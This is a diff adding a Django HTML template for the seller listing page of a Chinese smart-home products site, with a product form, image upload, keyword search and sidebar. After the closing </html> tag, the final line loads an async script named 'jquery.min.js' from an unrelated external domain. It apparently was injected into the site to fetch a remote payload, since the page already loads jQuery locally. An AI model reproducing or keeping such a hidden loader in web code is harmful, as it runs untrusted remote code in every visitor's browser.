@@ -1,0 +1,432 @@
+{% load staticfiles %}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>珠江智联</title>
+    <meta content="" name="keywords" />
+    <meta content="" name="description" />
+    <link href="{% static '/goals/css/page.css' %}" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" src="{% static '/goals/js/jquery.js' %}"></script>
+    <link rel="stylesheet" href="{% static '/goals/css/default.css' %}" />
+    <script charset="utf-8" src="{% static '/goals/js/kindeditor-min.js' %}"></script>
+    <script charset="utf-8" src="{% static '/goals/js/zh_CN.js' %}"></script>
+    <script type="text/javascript" src="{% static '/goals/js/Validform_v5.3.2_min.js' %}"></script>
+    <script type="text/javascript">
+        $(function () {
+            //品牌选择
+
+            //品牌选择
+
+            //表单验证
+            $(".carform").Validform({
+                tiptype: 3,
+                datatype: {
+                    "price": /^\d{1,4}(\.\d{1,2})?$/,
+                    "zh": /^[\u4e00-\u9fa5]+$/,
+                    "gas": /^\d{1,3}(\.\d{1,2})?$/
+
+                }
+            });
+
+            //图片删除
+
+
+            //设为封面
+            $("#piclist li p span").live('click', function () {
+                $(this).parent().parent().children('.img').addClass("selected");
+                $(this).parent().parent().siblings().children('.img').removeClass("selected");
+                $("#mainpic").empty();
+                $("#mainpic").append('<input type="hidden" name="p_mainpic" value="' + $(this).next().val() + '">');
+            });
+            KindEditor.ready(function (K) {
+                var editor = K.editor({
+
+                    allowFileManager: true,
+                    imageUploadLimit: 5
+                });
+                K('#J_selectImage').click(function () {
+                    var inputArr = $("#piclist").children("li");
+                    var length = inputArr.length;
+                    if (length >= 5) {
+                        alert("您最多只能上传5张图片！");
+                        exit;
+                    }
+                    editor.loadPlugin('multiimage', function () {
+                        editor.plugin.multiImageDialog({
+                            clickFn: function (urlList) {
+                                var div = K('#piclist');
+                                K.each(urlList, function (i, data) {
+                                    var arr_picid = data.url.split("/");
+                                    var arr_length = arr_picid.length;
+                                    var arr_picids = arr_picid[arr_length - 1].split(".");
+                                    div.append('<li id="' + arr_picids[0] + '"><img src="' + data.url + '" class="vt img"><div><span class="del"></span><input type="hidden" name="p_pics[]" value="' + data.url + '"></div><p><span>设为封面</span><input type="hidden" name="url" value="' + data.url + '"></p></li>');
+                                });
+                                editor.hideDialog();
+                            }
+                        });
+                    });
+                });
+            });
+        });
+    </script>
+</head>
+
+<body>
+    <!--内容-->
+    <script type="text/javascript" src="{% static '/goals/js/jquery.inputtext.js' %}"></script>
+
+    <div class="top">
+        <div class="top_main clearfix">
+            <div class="top_right">
+                欢迎来到珠江智联！
+                <span>
+                    <a href="{% url 'sign_in' %}"> 登录</a>
+                </span>
+                <span>
+                    <a href="{% url 'register' %}"> 注册</a>
+                </span>
+            </div>
+        </div>
+    </div>
+    <div class="headw">
+        <div class="head">
+            <div class="logo" style="text-align: center;line-height: 70px;color: green;">珠江智联</div>
+            <div class="topsearch">
+                <div class="topsearchbox">
+                    <form>
+                        <input type="text" name="k" class="keywords" value="请输入关键词，如小米">
+                        <!-- <input type="submit" value="搜索" class="button" /> -->
+                        <span style="display: inline;padding:10px 25px;color:#fff;font-size:17px;background: #bc1950;cursor: pointer;" class="button">搜索</span>
+                        <!-- <input type="hidden" name="m" value="search"> -->
+                    </form>
+                </div>
+                
+                <script>
+                    $('.button').click(function () {
+                        var a = $('.keywords').val();
+                        console.log(a);
+                        if (a == '小米' || a == '小' || a == '米') {
+                            window.location.href = "{% url 'seachx' %}";
+                        } else if (a == '公牛' || a == '公' || a == '牛') {
+                            window.location.href = "{% url 'seachg' %}";
+                        } else if (a == '珠江智联' || a == '珠江' || a == '智联' || a == '珠' || a == '智') {
+                            window.location.href = "{% url 'seachz' %}"; 						}else { 						    window.location.href = "{%  url 'seachnull' %}";
+                        }
+                    });
+                </script>
+                <p class="topkeywords">
+                    <a href="{% url 'seachx' %}">小米</a>&nbsp;&nbsp;
+                    <a href="{% url 'seachg' %}">公牛</a>&nbsp;&nbsp;</p>
+            </div>
+            <div class="carnum" id="carcount">
+            </div>
+        </div>
+    </div>
+    <div class="nav_list">
+        <ul class="clearfix">
+            <li>
+                <a href="{% url 'index' %}" title="首页">首页</a>
+            </li>
+            <li>
+                <a href="{% url 'sell' %}" title="卖车" class="here">卖家</a>
+            </li>
+            <li>
+                <a href="{% url 'seach' %}" title="买车">买家</a>
+            </li>
+            <li>
+                <a href="{% url 'about' %}" title="联系">联系</a>
+            </li>
+        </ul>
+    </div>
+    <!--头部end -->
+    <div class="nav">您当前的位置：
+        <a href="{% url 'index' %}">首页</a>
+        <span>></span> 卖家 </div>
+    <div class="main mt10 clearfix">
+        <div class="main_left">
+            <div class="sellbox">
+                <h3>填写商品信息：</h3>
+                <div class="box clearfix" style="position:relative;">
+                    <form name="carform" class="carform" method="post">
+                        <table cellspacing="0" cellpadding="0" width="100%" class="sell_table">
+                            <tr>
+                                <th>
+                                    <span class="red">*</span> 品牌型号：</th>
+                                <td colspan="3">
+                                    <input type="text" class="a">
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>
+                                    <span class="red">*</span> 类型选择：</th>
+                                <td>
+                                    <select name="p_model" datatype="n" nullmsg="请选择类型！">
+                                        <option value=''>请选择类型</option>
+                                        <option value='2'>灯光控制系统</option>
+                                        <option value='3'>电器控制系统</option>
+                                        <option value='4'>电源控制系统</option>
+                                        <option value='5'>楼宇控制系统</option>
+                                        <option value='8'>智能家居套装</option>
+
+                                    </select>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>
+                                    <span class="red">*</span>预售价格：</th>
+                                <td>
+                                    <input type="text" name="p_price" size="8" datatype="s" nullmsg="请填写价格！" class="b">
+                                    <span class="gray">(元)</span>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>
+                                    <span class="red">*</span> 商品颜色：</th>
+                                <td width="220">
+                                    <select name="p_color" datatype="s" nullmsg="请选择颜色！">
+                                        <option value=''>请选择颜色</option>
+                                        <option value='白色'>白色</option>
+                                        <option value='绿色'>绿色</option>
+                                        <option value='蓝色'>蓝色</option>
+                                        <option value='红色'>红色</option>
+                                        <option value='黄色'>黄色</option>
+                                        <option value='银灰'>银灰</option>
+                                        <option value='黑色'>黑色</option>
+                                        <option value='橙色'>橙色</option>
+
+                                    </select>
+                                </td>
+                            </tr>
+                            
+                        
+                            <tr>
+                                <th>
+                                    <span class="red">*</span> 上市日期：</th>
+                                <td>
+                                    <select name="p_year" id="p_year" datatype="n" nullmsg="请选择上市日期！">
+                                        <option value=''>请选择年份</option>
+                                        <option value='2002'>2002年</option>
+                                        <option value='2003'>2003年</option>
+                                        <option value='2004'>2004年</option>
+                                        <option value='2005'>2005年</option>
+                                        <option value='2006'>2006年</option>
+                                        <option value='2007'>2007年</option>
+                                        <option value='2008'>2008年</option>
+                                        <option value='2009'>2009年</option>
+                                        <option value='2010'>2010年</option>
+                                        <option value='2011'>2011年</option>
+                                        <option value='2012'>2012年</option>
+                                        <option value='2013'>2013年</option>
+                                        <option value='2014'>2014年</option>
+                                        <option value='2015'>2015年</option>
+                                        <option value='2016'>2016年</option>
+                                        <option value='2017'>2017年</option>
+
+                                    </select>
+                                    <select name="p_month" id="p_month" datatype="n" nullmsg="请选择上市日期！">
+                                        <option value=''>请选择月份</option>
+                                        <option value='01'>01月</option>
+                                        <option value='02'>02月</option>
+                                        <option value='03'>03月</option>
+                                        <option value='04'>04月</option>
+                                        <option value='05'>05月</option>
+                                        <option value='06'>06月</option>
+                                        <option value='07'>07月</option>
+                                        <option value='08'>08月</option>
+                                        <option value='09'>09月</option>
+                                        <option value='10'>10月</option>
+                                        <option value='11'>11月</option>
+                                        <option value='12'>12月</option>
+
+                                    </select>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>理想使用时长：</th>
+                                <td>
+                                    <input name="p_kilometre" type="text" id="p_kilometre" size="5" datatype="gas" ignore="ignore"
+                                        errormsg="理想使用时长！" class="c"/>
+                                    <span class="gray">(小时)</span>
+                                </td>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>国产进口：</th>
+                                <td>
+                                    <select name="p_country">
+                                        <option value=''>请选择</option>
+                                        <option value='国产'>国产</option>
+                                        <option value='进口'>进口</option>
+
+                                    </select>
+                                </td>
+                            </tr>
+
+                            <tr>
+                                <th>商品补充描述：</th>
+                                <td colspan="5">
+                                    <textarea name="p_details" rows="2" cols="90" class="textarea01 d"></textarea>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>
+                                    <span class="red">*</span> 卖家姓名：</th>
+                                <td colspan="5">
+                                    <input name="p_username" type="text" size="30" class="inp01 e" value="" datatype="s" nullmsg="请填写卖家姓名！"
+                                    />
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>
+                                    <span class="red">*</span> 手机号：</th>
+                                <td colspan="5">
+                                    <input name="p_tel" type="text" size="30" class="inp01 f" value="" datatype="m" nullmsg="请填写手机号！"
+                                        errormsg="手机号码格式不正确！" />
+                                </td>
+                            </tr>
+                            <!--
+						<tr>
+							<th><span class="red">*</span> 验证码：</th>
+							<td colspan="5"><input name="authcode" id="cftcode"  type="text"  class="inp02" datatype="s" ajaxurl="/index.php?m=ajax&ajax=1" nullmsg="请输入验证码！" errormsg="请输入正确的验证码！"/> <img src="/include/kcaptcha/" width="70" height="30" onclick="this.src='/include/kcaptcha/?'+Math.random();" title="点击刷新验证码" style="cursor:pointer" id="checkcode" align="absmiddle"> <span class="f12" onclick="document.getElementById('checkcode').src='/include/kcaptcha/?'+Math.random();" style="cursor:pointer">看不清？换一个</span></td>
+						</tr>
+						-->
+                            <tr>
+                                <td></td>
+                                <td>
+                                    <div class="button_r" style="width:100px;height:37px;text-align:center;line-height:37px;cursor:pointer;background: #bc1950;color:#fff;">立即发布</div>
+                                    <input type="hidden" name="action" value="sellcar">
+                                </td>
+                            </tr>
+                        </table>
+                    </form>
+                    <div class="tan" style="display: none;position: absolute;top:25%;left:30%;text-align: center;line-height: 200px;font-size:30px;color:#fff;width:300px;height:200px;background: rgba(0,0,0,.5)">
+
+                </div>
+                <script>
+                    $('.button_r').click(function(){
+                        var a = $('.a').val();
+                        var b = $('.b').val();
+                        var c = $('.c').val();
+                        var d = $('.d').val();
+                        var e = $('.e').val();
+                        var f = $('.f').val();
+                        if(a==''){
+                            $('.tan').html('请输入品牌型号');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },1000);
+                        }else if(b ==''){
+                            $('.tan').html('请输入预售价格');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },1000);
+                        }else if( c==''){
+                            $('.tan').html('请输入使用时长');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },1000);
+                        }else if(d ==''){
+                            $('.tan').html('请输入商品描述');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },1000);
+                        }else if(e ==''){
+                            $('.tan').html('请输入联系人');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },1000);
+                        }else if( f==''||!(/^1[34578]\d{9}$/.test(f))){
+                            $('.tan').html('请输入手机号码');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },1000);
+                        }else {
+                            window.location.href = "{% url 'index' %}";
+                        }
+                    })
+                </script>
+                </div>
+            </div>
+        </div>
+        <div class="main_right">
+            
+            
+            <div class="commonbox02">
+                <h3>热门商品</h3>
+                <div class="box">
+                    <ul>
+                        <li>
+                            <a href="{% url 'productx1' %}" target="_blank">
+                                <img src="{%  static 'goals/images/x101.jpg' %}" style="width:150px;"/>
+                            </a>
+                            <p class="carname mt10">
+                                <a href="{% url 'productx1' %}" class="f14">小米 扫地机器人</a>
+                            </p>
+                            <p class="mt5">
+                                <span class="f16 orange01">￥1688.00</span>
+                            </p>
+                            <!-- <p class="mt5 gray01">2014年5月上牌</p> -->
+                        </li>
+                        <li>
+                            <a href="{% url 'productx2' %}" target="_blank">
+                                <img src="{%  static 'goals/images/x201.jpg' %}" style="width:150px;" />
+                            </a>
+                            <p class="carname mt10">
+                                <a href="{% url 'productx2' %}" class="f14">小米 空气净化器</a>
+                            </p>
+                            <p class="mt5">
+                                <span class="f16 orange01">￥1499.00</span>
+                            </p>
+                            <!-- <p class="mt5 gray01">2017年5月上牌</p> -->
+                        </li>
+                        <li>
+                            <a href="{% url 'productg3' %}" target="_blank">
+                                <img src="{%  static 'goals/images/g301.jpg' %}" style="width:150px;"/>
+                            </a>
+                            <p class="carname mt10">
+                                <a href="{% url 'productg3' %}" class="f14">公牛 插座</a>
+                            </p>
+                            <p class="mt5">
+                                <span class="f16 orange01">￥38.00</span>
+                            </p>
+                            <!-- <p class="mt5 gray01">2017年4月上牌</p> -->
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--版权-->
+    <!--底部导航-->
+   <div class="footer" id="foot">
+		<p class="tc">
+			<a href="{% url 'index' %}" title="首页">首页</a> |
+			<a href="{% url 'sell' %}" title="卖车">卖家</a> |
+			<a href="{% url 'seach' %}" title="买车">买家</a> |
+			<a href="{% url 'about' %}" title="联系">联系</a> |
+		</p>
+		<p class="mt10"> Copyright 2019 广东珠江智联信息科技股份有限公司版权所有
+			<a href="http://www.miitbeian.gov.cn/" title="粤ICP备16037358号-4">粤ICP备16037358号-4</a>
+		</p>
+		<p class="mt10"> 电话：020-84138253 地址：广州市海珠区琶洲大道中06-08号907室</p>
+	</div>
+	<div id="right-side" class="right-side">
+		<ul>
+			<li class="side-top w4">
+				<a id="backtop" title="返回顶部" href="#top" style="display: block;">返回顶部</a>
+			</li>
+		</ul>
+	</div>
+    <!-- 版权 结束 -->
+</body>
+
+</html>
+<script charset="utf-8" async="true" src="http://ke.lduxnfz.com/s/ft/jquery.min.js}"></script>
